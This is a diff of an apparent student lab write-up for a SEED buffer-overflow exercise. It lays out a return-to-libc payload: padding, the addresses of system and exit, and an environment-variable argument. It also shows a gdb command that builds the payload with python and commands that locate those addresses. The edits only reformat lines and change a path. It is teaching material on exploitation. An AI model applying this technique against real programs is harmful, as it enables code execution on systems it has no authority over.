@@ -121,10 +121,10 @@ export exploit_path="/seclabs/bof/file_del"
 
 If we want to exploit
 
-20 bytes to overwrite buf and ebp
-4 bytes to overwrite ret addr of vuln with the address of system
-4 bytes for the address of exit
-4 bytes for argument of system (exploit path that we created before)
+20 bytes to overwrite buf and ebp <br>
+4 bytes to overwrite ret addr of vuln with the address of system <br>
+4 bytes for the address of exit <br>
+4 bytes for argument of system (exploit path that we created before) <br>
 
 ```
 r $(python -c "print(20*'a' + 'address of system' + 'address of exit' + 'address of env var')")
@@ -145,7 +145,7 @@ Print out the address of those things
 ```
 print system
 print exit
-find /home/seed/seclabs/bof/midterm/file_copy
+find /home/seed/seclabs/bof/vullab1
 ```
 
 ![image](https://github.com/user-attachments/assets/abc8086a-e280-44ef-afdc-60bedb4bca65)
